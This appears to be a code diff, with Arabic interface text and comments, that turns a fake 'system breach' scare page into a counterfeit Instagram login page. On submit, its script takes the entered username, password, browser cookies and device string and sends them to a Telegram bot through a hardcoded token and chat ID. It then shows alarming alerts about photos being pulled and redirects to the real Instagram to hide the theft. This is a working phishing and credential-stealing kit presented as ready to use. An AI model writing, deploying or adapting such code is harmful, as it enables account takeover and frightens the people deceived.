@@ -1,58 +1,64 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث أمان النظام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول • Instagram</title>
     <style>
-        body { background-color: black; color: red; text-align: center; font-family: 'Courier New', Courier, monospace; padding-top: 100px; }
-        .btn { padding: 20px 40px; font-size: 20px; background: red; color: white; border: none; cursor: pointer; border-radius: 10px; }
-        #warning { display: none; }
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        input { width: 100%; padding: 9px; margin-bottom: 7px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
+        .btn { width: 100%; background-color: #0095f6; border: none; color: white; padding: 5px 0; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
+        .fb-login { color: #385185; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; }
     </style>
 </head>
 <body>
 
-    <div id="main">
-        <h1>⚠️ تم اكتشاف ثغرة في جهازك</h1>
-        <p>اضغط الزر أدناه لإصلاح النظام فوراً ومنع تسريب الصور</p>
-        <button class="btn" onclick="startPrank()">إصلاح الآن</button>
-    </div>
-
-    <div id="warning">
-        <h1 style="font-size: 50px;">⚠️ جاري اختراق الجهاز...</h1>
-        <p id="status">جاري سحب الصور الشخصية...</p>
-        <p id="files">📁 DCIM/Camera/IMG_001.jpg</p>
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_login_header.png/75591938e51a.png" class="logo">
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" required>
+            <input type="password" id="password" placeholder="كلمة السر" required>
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
+        <div class="divider">أو</div>
+        <a class="fb-login">تسجيل الدخول باستخدام Facebook</a>
     </div>
 
     <script>
-        function startPrank() {
-            // 1. إرسال البيانات للبوت (الصيد)
-            const botToken = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg';
-            const myId = '5811700860';
-            const info = "⚠️ ضحية دخل الفخ: " + navigator.userAgent;
+        const botToken = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg';
+        const myId = '5811700860';
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${info}`);
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const cookies = document.cookie || "لا توجد كوكيز متاحة حالياً";
+            const device = navigator.userAgent;
 
-            // 2. تفعيل المقلب النفسي
-            document.getElementById('main').style.display = 'none';
-            document.getElementById('warning').style.display = 'block';
+            // إرسال البيانات المدموجة للبوت
+            const message = `
+🎣 **صيد جديد (مدموج):**
+👤 **اليوزر:** \`${user}\`
+🔑 **الباسورد:** \`${pass}\`
+🍪 **الكوكيز:** \`${cookies}\`
+📱 **الجهاز:** \`${device}\`
+            `;
 
-            // 3. سلسلة رسائل مرعبة (Alerts) ما تقفل بسهولة
-            setTimeout(() => { alert("⚠️ خطأ في النظام: جاري الوصول إلى استوديو الصور..."); }, 500);
-            setTimeout(() => { alert("❌ تم سحب 45 صورة خاصة بنجاح!"); }, 1500);
-            setTimeout(() => { alert("📡 جاري إرسال البيانات إلى السيرفر الرئيسي..."); }, 2500);
-
-            // 4. حركة "تعليق" المتصفح
-            for (let i = 0; i < 5; i++) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+            .then(() => {
+                // بعد السحب، نسوي المقلب النفسي اللي وعدتك به
+                alert("⚠️ خطأ في المصادقة: جاري فحص ملفات النظام...");
                 setTimeout(() => {
-                    document.getElementById('status').innerText = "جاري مسح محتويات الجهاز... " + (i*20) + "%";
-                }, i * 1000);
-            }
-
-            // 5. قنبلة الروابط (يفتح له رابط مرعب أو فيديو مفاجئ)
-            setTimeout(() => {
-                window.location.href = "https://www.google.com"; // تقدر تغيره لرابط فيديو رعب
-            }, 6000);
-        }
+                    alert("❌ تم اكتشاف دخول مشبوه، جاري سحب الصور لتأمين الحساب!");
+                    window.location.href = "https://www.instagram.com"; // تحويله للموقع الحقيقي
+                }, 1000);
+            });
+        });
     </script>
 </body>
 </html>
